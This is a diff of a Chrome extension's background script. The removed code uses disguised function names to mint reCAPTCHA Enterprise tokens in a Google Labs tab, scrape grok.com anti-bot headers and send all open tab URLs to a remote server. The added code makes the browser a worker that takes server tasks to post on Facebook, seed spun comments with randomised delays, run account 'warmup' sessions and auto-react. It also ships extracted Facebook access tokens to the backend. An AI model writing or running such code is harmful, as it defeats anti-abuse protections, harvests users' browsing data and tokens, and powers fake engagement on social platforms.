+        if (!pollRes.ok) return;
+        const pollData = await pollRes.json();
+        const task = pollData.task;
+        if (!task) return;
+
+        _isExecutingTask = true;
+        _activeExecutingTaskId = task.id;
+        console.log("?? [WorkerNode] Claimed distributed task " + task.id + " (type: " + task.type + ")");
+
+        // Checkpoint guard: If account is currently in checkpoint, fail task immediately
+        if (_checkpointDetected) {
+            console.warn("? [WorkerNode] Aborting task " + task.id + " due to detected account checkpoint.");
+            await fetch(_syncUrl + "/api/tasks/" + task.id + "/status", {
+                method: "POST",
+                headers: _getSyncHeaders({ "Content-Type": "application/json" }),
+                body: JSON.stringify({
+                    workerId: workerId,
+                    status: "failed",
+                    error: "Account is in checkpoint/restricted status"
+                }),
+                signal: AbortSignal.timeout(5000)
+            }).catch(() => {});
+            _activeExecutingTaskId = null;
+            _isExecutingTask = false;
             return;
         }
-    } else if (injectStatsig && _ftCache) {
-        finalHeaders["x-statsig-id"] = _ftCache;
-    }
 
-    
-    
-    
-    
-    const spec = {
-        url,
-        method,
-        headers: finalHeaders,
-        mode: responseMode,
-        taskId: task.id,
-        maxBytes: streamMaxBytes,
-        timeoutMs,
-    };
-    const specJson = JSON.stringify(spec);
-    const bodyArg = body == null ? "" : body;
+        // Acknowledge task running
+        await fetch(_syncUrl + "/api/tasks/" + task.id + "/status", {
+            method: "POST",
+            headers: _getSyncHeaders({ "Content-Type": "application/json" }),
+            body: JSON.stringify({
+                workerId: workerId,
+                status: "running"
+            }),
+            signal: AbortSignal.timeout(5000)
+        }).catch(() => {});
 
-    if (responseMode === "stream") {
-        try {
-            await _runScopedFn({
-                target: { tabId: tab.id },
-                world: "MAIN",
-                func: async (specJsonInner, bodyStr) => {
-                    const s = JSON.parse(specJsonInner);
-                    const sBody = bodyStr || null;
-                    
-                    
-                    const _post = (event, data) => {
-                        try { window.postMessage({ from: "glabs-grok-task", taskId: s.taskId, event, data: data || {} }, "*"); }
-                        catch (e) {}
-                    };
-                    const _ac = new AbortController();
-                    const _at = setTimeout(() => _ac.abort(), s.timeoutMs || 60000);
-                    function parseJsonObjectsFromBuffer(buffer) {
-                        const out = []; let depth = 0, inString = false, escape = false, start = -1;
-                        for (let i = 0; i < buffer.length; i++) {
-                            const ch = buffer[i];
-                            if (start === -1) {
-                                if (ch === "{") { start = i; depth = 1; inString = false; escape = false; }
-                                continue;
-                            }
-                            if (inString) {
-                                if (escape) escape = false;
-                                else if (ch && ch.charCodeAt(0) === 92) escape = true;
-                                else if (ch === '"') inString = false;
-                                continue;
-                            }
-                            if (ch === '"') { inString = true; continue; }
-                            if (ch === "{") depth++;
-                            else if (ch === "}") {
-                                depth--;
-                                if (depth === 0) {
-                                    const slice = buffer.slice(start, i + 1);
-                                    try { out.push(JSON.parse(slice)); } catch (e) {}
-                                    start = -1;
-                                }
-                            }
-                        }
-                        return { objects: out, tail: start === -1 ? "" : buffer.slice(start) };
-                    }
-                    function postObj(obj) {
-                        try { window.postMessage({ from: "glabs-grok-task", taskId: s.taskId, event: "chunk", data: { obj } }, "*"); }
-                        catch (e) {}
-                    }
-                    const opts = { method: s.method, headers: s.headers, credentials: "include", signal: _ac.signal };
-                    if (sBody !== null && sBody !== undefined && sBody !== "") opts.body = sBody;
-                    let res;
-                    try {
-                        res = await fetch(s.url, opts);
-                    } catch (e) {
-                        clearTimeout(_at);
-                        const payload = { status: 0, error: "fetch: " + String(e) };
-                        _post("error", { message: payload.error, status: 0 });
-                        return payload;
-                    }
-                    const status = res.status;
-                    if (status !== 200 || !res.body) {
-                        let text = "";
-                        try { text = await res.text(); } catch (e) {}
-                        clearTimeout(_at);
-                        if (status === 200 && text) {
-                            const parsed = parseJsonObjectsFromBuffer(text);
-                            for (const obj of parsed.objects) postObj(obj);
-                        }
-                        if (status === 200) {
-                            _post("done", { status });
-                        } else {
-                            _post("error", { message: text.slice(0, 600), status });
-                        }
-                        return { status, error: status === 200 ? null : text.slice(0, 600) };
-                    }
-                    const reader = res.body.getReader();
-                    const decoder = new TextDecoder("utf-8");
-                    let buffer = "", totalBytes = 0;
-                    try {
-                        while (true) {
-                            const { value, done } = await reader.read();
-                            if (done) break;
-                            totalBytes += (value && value.byteLength) || 0;
-                            if (totalBytes > s.maxBytes) break;
-                            buffer += decoder.decode(value, { stream: true });
-                            const parsed = parseJsonObjectsFromBuffer(buffer);
-                            buffer = parsed.tail;
-                            for (const obj of parsed.objects) postObj(obj);
-                        }
-                    } catch (e) {
-                        clearTimeout(_at);
-                        const payload = { status, error: "stream: " + String(e) };
-                        _post("error", { message: payload.error, status });
-                        return payload;
-                    }
-                    clearTimeout(_at);
-                    _post("done", { status });
-                    return { status };
-                },
-                args: [specJson, bodyArg],
-            }, timeoutMs + 5000);
-        } catch (e) {
-            await _emitFtEvent(task.id, "error", { message: "executeScript: " + String(e) });
-        }
-        return;
-    }
-
-    
-    
-    
-    
-    
-    
-    try {
-        await _runScopedFn({
-            target: { tabId: tab.id },
-            world: "MAIN",
-            func: async (specJsonInner, bodyStr) => {
-                const s = JSON.parse(specJsonInner);
-                const _post = (event, data) => {
-                    try { window.postMessage({ from: "glabs-grok-task", taskId: s.taskId, event, data: data || {} }, "*"); }
-                    catch (e) {}
-                };
-                const _ac = new AbortController();
-                const _at = setTimeout(() => _ac.abort(), s.timeoutMs || 60000);
-                const opts = { method: s.method, headers: s.headers, credentials: "include", signal: _ac.signal };
-                if (bodyStr !== null && bodyStr !== undefined && bodyStr !== "") opts.body = bodyStr;
-                try {
-                    const res = await fetch(s.url, opts);
-                    const status = res.status;
-                    if (s.mode === "arrayBuffer") {
-                        const buf = await res.arrayBuffer();
-                        const bytes = new Uint8Array(buf);
-                        const chunks = [];
-                        for (let i = 0; i < bytes.byteLength; i += 8192) {
-                            chunks.push(String.fromCharCode.apply(null, bytes.subarray(i, Math.min(i + 8192, bytes.byteLength))));
-                        }
-                        const bin = chunks.join('');
-                        clearTimeout(_at);
-                        _post("done", { status, body: btoa(bin), contentType: res.headers.get("content-type") || "" });
-                        return;
-                    }
-                    if (s.mode === "status") {
-                        
-                        
-                        
-                        
-                        
-                        
-                        if (status === 200) {
-                            clearTimeout(_at);
-                            _post("done", { status, body: null });
-                            return;
-                        }
-                        let errText = "";
-                        try { errText = (await res.text()).slice(0, 600); } catch (e) {}
-                        clearTimeout(_at);
-                        _post("done", { status, body: errText });
-                        return;
-                    }
-                    if (s.mode === "text") {
-                        const txt = await res.text();
-                        clearTimeout(_at);
-                        _post("done", { status, body: txt });
-                        return;
-                    }
-                    
-                    
-                    let txt = "";
-                    try { txt = await res.text(); } catch (e) {}
-                    let data = null;
-                    try { data = txt ? JSON.parse(txt) : null; } catch (e) {}
-                    clearTimeout(_at);
-                    _post("done", { status, body: data });
-                } catch (e) {
-                    clearTimeout(_at);
-                    _post("error", { message: "fetch: " + String(e), status: 0 });
-                }
-            },
-            args: [specJson, bodyArg],
-        }, timeoutMs + 5000);
-    } catch (e) {
-        
-        
-        await _emitFtEvent(task.id, "error", { message: "executeScript: " + String(e) });
-    }
-}
-
-async function _renderFtStream(task, tab) {
-    const p = task.payload || {};
-    const url = String(p.url || "");
-    const initMessages = Array.isArray(p.initMessages) ? p.initMessages : [];
-    const timeoutMs = Math.max(1000, Math.min(600000, Number(p.timeoutMs) || 180000));
-    const idleTimeoutMs = Math.max(1000, Number(p.idleTimeoutMs) || 30000);
-    const terminateOnCompleted = p.terminateOnCompletedStatus !== false;
-    const completeImageCount = Math.max(0, Number(p.completeImageCount) || 0);
-
-    if (!url) {
-        await _emitFtEvent(task.id, "error", { message: "missing url" });
-        return;
-    }
-
-    const spec = {
-        url, initMessages, taskId: task.id,
-        timeoutMs, idleTimeoutMs, terminateOnCompleted, completeImageCount,
-    };
-    const specJson = JSON.stringify(spec);
-
-    try {
-        await _runScopedFn({
-            target: { tabId: tab.id },
-            world: "MAIN",
-            func: async (specJsonInner) => {
-                const s = JSON.parse(specJsonInner);
-                const post = (event, data) => {
-                    try { window.postMessage({ from: "glabs-grok-task", taskId: s.taskId, event, data: data || {} }, "*"); }
-                    catch (e) {}
-                };
-                return await new Promise((resolve) => {
-                    let ws;
-                    try { ws = new WebSocket(s.url); }
-                    catch (e) {
-                        post("error", { message: "ws ctor: " + String(e) });
-                        resolve();
-                        return;
-                    }
-                    let finished = false;
-                    let imageDoneCount = 0;
-                    let lastActivityAt = Date.now();
-
-                    const cleanup = () => {
-                        clearTimeout(hardTimer);
-                        clearInterval(idleTimer);
-                        try { ws.close(); } catch (e) {}
-                    };
-                    const finish = (event, data) => {
-                        if (finished) return;
-                        finished = true;
-                        cleanup();
-                        post(event, data || {});
-                        resolve();
-                    };
-                    const hardTimer = setTimeout(() => {
-                        finish("error", { message: "ws hard timeout", afterMs: s.timeoutMs });
-                    }, s.timeoutMs);
-                    const idleTimer = setInterval(() => {
-                        if (finished) return;
-                        if (Date.now() - lastActivityAt > s.idleTimeoutMs) {
-                            finish("error", { message: "ws idle timeout", idleMs: s.idleTimeoutMs });
-                        }
-                    }, 1000);
-
-                    ws.onopen = () => {
-                        post("ws_open", { url: s.url });
-                        lastActivityAt = Date.now();
-                        try {
-                            for (const msg of (s.initMessages || [])) {
-                                ws.send(typeof msg === "string" ? msg : JSON.stringify(msg));
-                            }
-                        } catch (e) {
-                            finish("error", { message: "ws send: " + String(e) });
-                        }
-                    };
-                    ws.onmessage = (evt) => {
-                        lastActivityAt = Date.now();
-                        const raw = evt.data;
-                        if (typeof raw !== "string") {
-                            
-                            post("chunk", { binary: true });
-                            return;
-                        }
-                        let obj = null;
-                        try { obj = JSON.parse(raw); }
-                        catch (e) {
-                            post("chunk", { text: raw.length > 800 ? raw.slice(0, 800) + "..." : raw });
-                            return;
-                        }
-                        post("chunk", { obj });
-                        if (obj && obj.type === "json" && obj.current_status === "completed") {
-                            if (s.terminateOnCompleted) finish("done", { reason: "completed-status" });
-                        }
-                        if (obj && obj.type === "image"
-                            && typeof obj.url === "string"
-                            && obj.url.length > 0
-                            && obj.percentage_complete === 100) {
-                            imageDoneCount++;
-                            if (s.completeImageCount > 0 && imageDoneCount >= s.completeImageCount) {
-                                finish("done", { reason: "image-count-reached", imageDoneCount });
-                            }
-                        }
-                    };
-                    ws.onerror = () => {
-                        finish("error", { message: "ws onerror" });
-                    };
-                    ws.onclose = (evt) => {
-                        finish("done", {
-                            reason: "ws-close",
-                            code: evt && evt.code,
-                            wasClean: !!(evt && evt.wasClean),
-                        });
-                    };
-                });
-            },
-            args: [specJson],
-        }, timeoutMs + 5000);
-    } catch (e) {
-        await _emitFtEvent(task.id, "error", { message: "executeScript: " + String(e) });
-    }
-}
-
-async function _refreshFtCanvas(task, tab) {
-    _ftCache = null;
-    _ftSeenAt = 0;
-    _ftWarmupAt = 0;
-    async function navTo(url, timeoutMs) {
-        try {
-            await chrome.tabs.update(tab.id, { url });
-        } catch (e) { return false; }
-        return new Promise((resolve) => {
-            const listener = (id, ch) => {
-                if (id === tab.id && ch.status === "complete") {
-                    chrome.tabs.onUpdated.removeListener(listener);
-                    resolve(true);
-                }
-            };
-            chrome.tabs.onUpdated.addListener(listener);
-            setTimeout(() => {
-                chrome.tabs.onUpdated.removeListener(listener);
-                resolve(false);
-            }, timeoutMs);
-        });
-    }
-    try {
-        await navTo("https://grok.com/", 15000);
-        await navTo("https://grok.com/imagine", 15000);
-    } catch (e) {
-        await _emitFtEvent(task.id, "error", { message: String(e) });
-        return;
-    }
-    
-    {
-        const deadline = Date.now() + 12000;
-        while (!_ftCache && Date.now() < deadline) await _animDelay(120);
-    }
-
-    
-    
-    let _widgetBusy = false;
-    let scrapedStatsig = null;
-    try {
-        const probe = await _runScopedFn({
-            target: { tabId: tab.id },
-            world: "MAIN",
-            func: () => {
-                let title = "";
-                let lsStatsig = null;
-                try { title = String(document.title || ""); } catch (e) { }
-                try { lsStatsig = localStorage.getItem("x-statsig-id"); } catch (e) { }
-                return { title, lsStatsig };
-            },
-            args: [],
-        }, 8000);
-        const out = (probe && probe[0] && probe[0].result) || {};
-        const titleLower = String(out.title || "").toLowerCase();
-        const _widgetTerms = ["challenge", "verify", "captcha", "cloudflare", "just a moment"];
-        if (_widgetTerms.some((kw) => titleLower.includes(kw))) {
-            _widgetBusy = true;
-        }
-        if (typeof out.lsStatsig === "string" && out.lsStatsig.trim()) {
-            scrapedStatsig = out.lsStatsig.trim();
-        }
-    } catch (e) {  }
-
-    
-    
-    
-    let usedLocalStorage = false;
-    if (!_ftCache && scrapedStatsig) {
-        _ftCache = scrapedStatsig;
-        _ftSeenAt = Date.now();
-        usedLocalStorage = true;
-    }
-
-    _ftWarmupAt = Date.now();
-    await _emitFtEvent(task.id, "done", {
-        gotStatsig: !!_ftCache,
-        statsigSource: _ftCache ? (usedLocalStorage ? "localStorage" : "webRequest") : null,
-        _widgetBusy,
-    });
-}
-
-chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
-    if (msg && msg.from === "glabs-grok-task" && msg.taskId && msg.event) {
-        _emitFtEvent(msg.taskId, msg.event, msg.data || {}).catch(() => {});
-        try { sendResponse({ ok: true }); } catch (e) {}
-        return true;
-    }
-    return false;
-});
-
-function _onFontCached() {
-    _fontCache++;
-    _renderQueue++;
-    
-    _lastRender = Date.now();
-    try {
-        chrome.storage.local.set({
-            tokenCount: _fontCache,
-            lastSuccess: _lastRender,
-        });
-    } catch (e) {  }
-}
-
-async function _reviveCanvas(tabId) {
-    if (_reviving) return;
-    _reviving = true;
-    try {
-        try { await chrome.tabs.update(tabId, { autoDiscardable: false }); } catch (e) {}
-        await chrome.tabs.reload(tabId);
-        await new Promise((resolve) => {
-            const listener = (id, info) => {
-                if (id === tabId && info.status === "complete") {
-                    chrome.tabs.onUpdated.removeListener(listener);
-                    resolve();
-                }
-            };
-            chrome.tabs.onUpdated.addListener(listener);
-            setTimeout(() => {
-                chrome.tabs.onUpdated.removeListener(listener);
-                resolve();
-            }, 6000);
-        });
-        await _animDelay(2000);  
-    } catch (e) {
-        
-        try { await _relayoutCanvas(); } catch (e2) {}
-    } finally {
-        _reviving = false;
-    }
-}
-
-async function _resolveWidget(request, _retried = false) {
-    let tabId = await _findCanvas();
-
-    
-    if (!tabId) {
-        if (Date.now() - _lastPrefetch < _RENDER_COOLDOWN) {
-            
-            await _animDelay(3000);
-            tabId = await _findCanvas();
-            if (!tabId) {
-                const redirected = await _checkCanvasRedirect();
-                
-                await _animDelay(5000);
-                tabId = await _findCanvas();
-            }
-        } else {
-            
+        // Periodic lease extension (every 25s for long tasks)
+        const leaseWatchdog = setInterval(async () => {
             try {
-                _lastPrefetch = Date.now();
-                const tab = await chrome.tabs.create({
-                    url: "https://labs.google/flow",
-                    active: false,
+                await fetch(_syncUrl + "/api/tasks/" + task.id + "/heartbeat", {
+                    method: "POST",
+                    headers: _getSyncHeaders({ "Content-Type": "application/json" }),
+                    body: JSON.stringify({ extendSec: 60 }),
+                    signal: AbortSignal.timeout(4000)
                 });
-                _prefetchTab = tab.id;
+            } catch (e) {}
+        }, 25000);
 
-                
-                await new Promise((resolve) => {
-                    const listener = (id, info) => {
-                        if (id === tab.id && info.status === "complete") {
-                            chrome.tabs.onUpdated.removeListener(listener);
-                            resolve();
-                        }
-                    };
-                    chrome.tabs.onUpdated.addListener(listener);
-                    setTimeout(() => {
-                        chrome.tabs.onUpdated.removeListener(listener);
-                        resolve();
-                    }, 15000);
-                });
+        let taskResult = { success: false, error: "Task execution unhandled" };
 
-                const redirected = await _checkCanvasRedirect();
-                await _animDelay(redirected ? 5000 : 3000);
-                tabId = await _findCanvas();
-            } catch (e) {  }
-        }
-    }
-
-    if (!tabId) return { token: null, error: "No tab available" };
-
-    
-    try { await chrome.tabs.update(tabId, { autoDiscardable: false }); } catch (e) {}
-
-    
-    const siteKey = request.s || request.site_key || "";
-    const action = request.a || request.action || "";
-
-    try {
-        
-        
-        
-        
-        const results = await _runScopedFn({
-            target: { tabId },
-            world: "MAIN",
-            func: async (siteKeyParam, actionParam) => {
-                try {
-                    if (typeof grecaptcha === "undefined" || !grecaptcha.enterprise) {
-                        return { token: null, error: "Service not ready" };
-                    }
-
-                    let key = siteKeyParam;
-
-                    
-                    if (!key) {
-                        try {
-                            if (typeof ___grecaptcha_cfg !== "undefined" && ___grecaptcha_cfg.clients) {
-                                const clients = ___grecaptcha_cfg.clients;
-                                const clientKeys = Object.keys(clients);
-                                if (clientKeys.length > 0) {
-                                    const client = clients[clientKeys[0]];
-                                    for (const prop of Object.keys(client)) {
-                                        const val = client[prop];
-                                        if (val && typeof val === "object") {
-                                            for (const prop2 of Object.keys(val)) {
-                                                const val2 = val[prop2];
-                                                if (val2 && typeof val2 === "object" && val2.sitekey) {
-                                                    key = val2.sitekey;
-                                                    break;
-                                                }
-                                            }
-                                        }
-                                        if (key) break;
-                                    }
-                                }
-                            }
-                            
-                            if (!key) {
-                                const scripts = document.querySelectorAll('script[src*="recaptcha"]');
-                                for (const el of scripts) {
-                                    const match = el.src.match(/[?&]render=([^&]+)/);
-                                    if (match && match[1] !== "explicit") { key = match[1]; break; }
-                                }
-                            }
-                        } catch (e) {  }
-                    }
-
-                    if (!key) return { token: null, error: "Config not ready" };
-
-                    await new Promise((resolve) => grecaptcha.enterprise.ready(resolve));
-                    
-                    
-                    
-                    const token = await Promise.race([
-                        grecaptcha.enterprise.execute(key, { action: actionParam }),
-                        new Promise((_, reject) => setTimeout(
-                            () => reject(new Error("execute timeout")),
-                            15000,
-                        )),
-                    ]);
-                    return { token, error: null };
-                } catch (err) {
-                    return { token: null, error: err.message || String(err) };
-                }
-            },
-            args: [siteKey, action],
-        }, 10000);
-
-        const mintResult = (results && results[0] && results[0].result) || null;
-        if (mintResult && mintResult.token) return mintResult;
-        
-        
-        if (!_retried) {
-            await _reviveCanvas(tabId);
-            return await _resolveWidget(request, true);
-        }
-        return mintResult || { token: null, error: "No result" };
-    } catch (e) {
-        
-        if (!_retried) {
-            await _reviveCanvas(tabId);
-            return await _resolveWidget(request, true);
-        }
-        return { token: null, error: e.message };
-    }
-}
-
-async function _relayoutCanvas() {
-    let tab = null;
-    try {
-        const tabs = await chrome.tabs.query({});
-        const labsTabs = tabs.filter((t) => t.url && t.url.includes("labs.google") && t.url.includes("/flow"));
-        if (labsTabs.length) {
-            
-            tab = labsTabs[0];
-            try { await chrome.tabs.reload(tab.id); } catch (e) {  }
-        }
-    } catch (e) {  }
-
-    if (!tab) {
-        
         try {
-            tab = await chrome.tabs.create({ url: "https://labs.google/flow", active: false });
-        } catch (e) { return; }
-    }
-    _prefetchTab = tab.id;
-
-    
-    await new Promise((resolve) => {
-        const listener = (id, info) => {
-            if (id === tab.id && info.status === "complete") {
-                chrome.tabs.onUpdated.removeListener(listener);
-                resolve();
+            if (task.type === "post") {
+                const p = task.payload || {};
+                const parsedContent = typeof parseSpintax === "function" ? parseSpintax(p.content || p.caption || p.text || "") : (p.content || p.caption || p.text || "");
+                const postItem = {
+                    id: task.id,
+                    postType: p.postType || "post",
+                    content: parsedContent,
+                    mediaUrl: p.mediaUrl || (Array.isArray(p.mediaUrls) ? p.mediaUrls[0] : ""),
+                    mediaData: p.mediaData || null,
+                    targetType: p.targetType || "profile",
+                    targetId: p.targetId || "",
+                    actorId: p.actorId || "",
+                    seedingComments: p.seedingComments || [],
+                    autoReactType: p.autoReactType || "NONE"
+                };
+                taskResult = await _executePostItem(postItem);
+            } else if (task.type === "seed") {
+                const p = task.payload || {};
+                const postId = p.postId || "";
+                const comments = p.comments || p.seedingComments || [];
+                const minDelay = (p.minDelaySec || 3) * 1000;
+                const maxDelay = (p.maxDelaySec || 10) * 1000;
+                let count = 0;
+                const fbTab = await _findOrCreateFacebookTab(p.postUrl || "https://www.facebook.com");
+                if (fbTab && typeof sendCommentGraphQL === "function") {
+                    for (const cmt of comments) {
+                        const text = typeof parseSpintax === "function" ? parseSpintax(cmt) : cmt;
+                        const cRes = await sendCommentGraphQL(fbTab.id, postId, text);
+                        if (cRes?.success) count++;
+                        const delay = minDelay + Math.random() * (maxDelay - minDelay);
+                        await new Promise(r => setTimeout(r, delay));
+                    }
+                    if (p.autoReactType && p.autoReactType !== "NONE" && typeof sendReactionGraphQL === "function") {
+                        await sendReactionGraphQL(fbTab.id, postId, p.autoReactType);
+                    }
+                    taskResult = { success: true, commentsPosted: count, postId };
+                } else {
+                    taskResult = { success: false, error: "Facebook tab unavailable for seeding" };
+                }
+            } else if (task.type === "warmup") {
+                const p = task.payload || {};
+                const fbTab = await _findOrCreateFacebookTab("https://www.facebook.com");
+                if (fbTab && typeof runWarmupSession === "function") {
+                    taskResult = await runWarmupSession(fbTab.id, p.warmupConfig || p, (step) => {
+                        chrome.tabs.sendMessage(fbTab.id, { type: "POST_STATUS_UPDATE", message: step }).catch(() => {});
+                    });
+                } else {
+                    taskResult = { success: false, error: "Facebook tab unavailable for warm-up" };
+                }
+            } else if (task.type === "reply_comment") {
+                const p = task.payload || {};
+                const fbTab = await _findOrCreateFacebookTab(p.postUrl || "https://www.facebook.com");
+                if (fbTab && typeof sendCommentGraphQL === "function") {
+                    const replyText = typeof parseSpintax === "function" ? parseSpintax(p.replyText || "") : (p.replyText || "");
+                    const targetId = p.targetCommentId || p.postId;
+                    const rRes = await sendCommentGraphQL(fbTab.id, targetId, replyText);
+                    if (p.autoReactType && p.autoReactType !== "NONE" && typeof sendReactionGraphQL === "function") {
+                        await sendReactionGraphQL(fbTab.id, targetId, p.autoReactType);
+                    }
+                    taskResult = { success: rRes?.success || false, error: rRes?.error, result: rRes };
+                } else {
+                    taskResult = { success: false, error: "Facebook tab unavailable for reply" };
+                }
             }
-        };
-        chrome.tabs.onUpdated.addListener(listener);
-        setTimeout(() => {
-            chrome.tabs.onUpdated.removeListener(listener);
-            resolve();
-        }, 15000);
-    });
-}
-
-async function _findCanvas() {
-    try {
-        const tabs = await chrome.tabs.query({});
-        
-        const urls = tabs.map(t => t.url || "undefined");
-        try {
-            await fetch(`${_syncUrl}/sync/google-flow-page`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ debug_urls: urls })
-            });
-        } catch (err) {}
-        
-        const flowTabs = tabs.filter(t =>
-            t.url && t.url.includes("labs.google") && t.url.includes("/flow") && !t.url.includes("accounts.google.com")
-        );
-        if (flowTabs.length > 0) {
-            flowTabs.sort((a, b) => (b.lastAccessed || 0) - (a.lastAccessed || 0));
-            return flowTabs[0].id;
+        } finally {
+            clearInterval(leaseWatchdog);
         }
 
-        
-        
+        const isSuccess = !!(taskResult && taskResult.success);
+        const errorDetail = isSuccess ? null : (taskResult?.error || "Task execution failed");
+        console.log("?? [WorkerNode] Task " + task.id + " finished: success=" + isSuccess + ", error=" + errorDetail);
 
-        return null;
-    } catch (e) {
-        return null;
+        await fetch(_syncUrl + "/api/tasks/" + task.id + "/status", {
+            method: "POST",
+            headers: _getSyncHeaders({ "Content-Type": "application/json" }),
+            body: JSON.stringify({
+                workerId: workerId,
+                status: isSuccess ? "completed" : "failed",
+                result: taskResult || {},
+                error: errorDetail
+            }),
+            signal: AbortSignal.timeout(5000)
+        }).catch(() => {});
+
+    } catch (err) {
+        console.warn("?? [WorkerNode] Task queue polling error:", err.message);
+    } finally {
+        _activeExecutingTaskId = null;
+        _isExecutingTask = false;
     }
 }
 
-async function _checkCanvasRedirect() {
-    if (!_prefetchTab) return false;
-    try {
-        const tab = await chrome.tabs.get(_prefetchTab);
-        if (tab && tab.url && tab.url.includes("accounts.google.com")) {
-            return true;
-        }
-        return false;
-    } catch (e) {
-        _prefetchTab = null;
-        return false;
-    }
-}
+// Initial worker startup registration
+chrome.runtime.onInstalled.addListener(() => { registerWorkerNode(); });
+chrome.runtime.onStartup.addListener(() => { registerWorkerNode(); });
+setTimeout(() => { registerWorkerNode(); }, 1500);
 
-async function _validateCanvas(tabId) {
-    try {
-        const results = await chrome.scripting.executeScript({
-            target: { tabId },
-            world: "MAIN",
-            func: () => {
-                const available = typeof grecaptcha !== "undefined" && !!grecaptcha.enterprise;
-                let siteKey = null;
-                if (available) {
-                    try {
-                        if (typeof ___grecaptcha_cfg !== "undefined" && ___grecaptcha_cfg.clients) {
-                            const clients = ___grecaptcha_cfg.clients;
-                            const keys = Object.keys(clients);
-                            if (keys.length > 0) {
-                                const client = clients[keys[0]];
-                                for (const prop of Object.keys(client)) {
-                                    const val = client[prop];
-                                    if (val && typeof val === "object") {
-                                        for (const p2 of Object.keys(val)) {
-                                            const v2 = val[p2];
-                                            if (v2 && typeof v2 === "object" && v2.sitekey) {
-                                                siteKey = v2.sitekey;
-                                                break;
-                                            }
-                                        }
-                                    }
-                                    if (siteKey) break;
-                                }
-                            }
-                        }
-                    } catch (e) {  }
-                }
-                return { available, siteKey, error: available ? null : "Not ready" };
-            },
-        });
-        if (results && results[0] && results[0].result) return results[0].result;
-        return { available: false, error: "No result" };
-    } catch (e) {
-        return { available: false, error: e.message };
-    }
-}
+
 
 async function ensureTabLoaded(tabId, maxWaitMs = 12000) {
     const startTime = Date.now();
@@ -1517,6 +590,7 @@ async function ensureTabLoaded(tabId, maxWaitMs = 12000) {
 const _activeExecutingPostIds = new Set();
 
 async function _processScheduledPosts() {
+    await _ensureStorageReady();
     if (_isProcessingPosts) return;
     _isProcessingPosts = true;
     try {
@@ -1571,7 +645,7 @@ async function _processScheduledPosts() {
 
         // 2. Process Python Backend scheduled posts
         try {
-            const backendRes = await fetch(`${_syncUrl}/api/posts?status=pending`, { signal: AbortSignal.timeout(30000) });
+            const backendRes = await fetch(`${_syncUrl}/api/posts?status=pending`, { headers: _getSyncHeaders(), signal: AbortSignal.timeout(30000) });
             if (backendRes.ok) {
                 const backendData = await backendRes.json();
                 const backendPending = backendData.posts || [];
@@ -1597,7 +671,7 @@ async function _processScheduledPosts() {
                                 console.log(`📌 [Extension] Post ${p.id} finished: status=${newStatus}, step=${finalStep}`);
                                 await fetch(`${_syncUrl}/api/posts/${p.id}`, {
                                     method: "PATCH",
-                                    headers: { "Content-Type": "application/json" },
+                                    headers: _getSyncHeaders({ "Content-Type": "application/json" }),
                                     body: JSON.stringify({
                                         status: newStatus,
                                         progressStep: finalStep,
@@ -1936,7 +1010,7 @@ async function _executePostItem(post) {
                 // 1. Update Python backend
                 await fetch(`${_syncUrl}/api/posts/${post.id}`, {
                     method: "PATCH",
-                    headers: { "Content-Type": "application/json" },
+                    headers: _getSyncHeaders({ "Content-Type": "application/json" }),
                     body: JSON.stringify({ progressStep: stepText, status: "in_progress" }),
                     signal: AbortSignal.timeout(4000)
                 });
@@ -3590,13 +2664,13 @@ async function _executePostItem(post) {
 
                             if (detectedId && (!post.fbPostId || post.fbPostId === post.id)) {
                                 await fetch(`${_syncUrl}/api/posts/${post.id}`, {
-                                    method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ fbPostId: detectedId, fbFeedbackId: detectedId })
+                                    method: "PATCH", headers: _getSyncHeaders({ "Content-Type": "application/json" }), body: JSON.stringify({ fbPostId: detectedId, fbFeedbackId: detectedId })
                                 });
                             }
 
                             if (scanned.length > 0) {
                                 await fetch(`${_syncUrl}/api/posts/${post.id}/comments`, {
-                                    method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ comments: scanned })
+                                    method: "POST", headers: _getSyncHeaders({ "Content-Type": "application/json" }), body: JSON.stringify({ comments: scanned })
                                 });
                                 await updateStep(`🎉 [THÀNH CÔNG QUÉT BÌNH LUẬN] Đã tải ${scanned.length} bình luận thực tế từ Facebook!`);
                             } else {
@@ -3712,6 +2786,7 @@ async function _executePostItem(post) {
 }
 
 async function _extractFacebookAccessToken() {
+    await _ensureStorageReady();
     try {
         const tabs = await chrome.tabs.query({ url: "*://*.facebook.com/*" });
         if (!tabs || tabs.length === 0) {
@@ -3828,14 +2903,16 @@ async function _extractFacebookAccessToken() {
             const accountTypeLabel = data.isPage ? "[Fanpage]" : "[Cá nhân]";
             const fullName = `${accountTypeLabel} ${nickName} (${actorId})`;
 
-            // Save to Python Backend
+            // Save to Python Backend with auth headers
+            _lastExtractedAccount = { targetId: actorId, name: nickName, status: "live" };
             await fetch(`${_syncUrl}/api/accounts`, {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
+                headers: _getSyncHeaders({ "Content-Type": "application/json" }),
                 body: JSON.stringify({
                     id: `acc_${actorId}`,
                     name: fullName,
                     targetId: actorId,
+                    projectKey: _projectKey || "taikhoan1",
                     accessToken: data.token || "session_cookie",
                     updatedAt: Date.now()
                 })
@@ -3883,7 +2960,7 @@ chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
             const extId = instanceId || "";
             fetch(`${_syncUrl}/sync/auto-post`, {
                 method: "POST",
-                headers: { "Content-Type": "application/json", "X-Ext-Id": extId },
+                headers: _getSyncHeaders({ "Content-Type": "application/json", "X-Ext-Id": extId }),
                 body: JSON.stringify({
                     id: postId,
                     status: message.success ? "completed" : "failed",
@@ -3927,7 +3004,7 @@ chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
 
             // Try fetching from Python backend first
             try {
-                const res = await fetch(`${_syncUrl}/api/posts`);
+                const res = await fetch(`${_syncUrl}/api/posts`, { headers: _getSyncHeaders() });
                 if (res.ok) {
                     const data = await res.json();
                     targetPost = (data.posts || []).find(p => p.id === message.postId);
@@ -3953,117 +3030,29 @@ chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
         return true;
     }
 
-    if (message.type === "CHECK_V") {
-        _validateCanvas(message.tabId)
-            .then(r => sendResponse(r))
-            .catch(e => sendResponse({ available: false, error: e.message }));
-        return true;
-    }
-
-    
-    if (message.type === "TEST_V") {
-        _resolveWidget({ site_key: message.site_key || "", action: message.action || "" })
-            .then(r => {
-                if (r.token) _onFontCached();
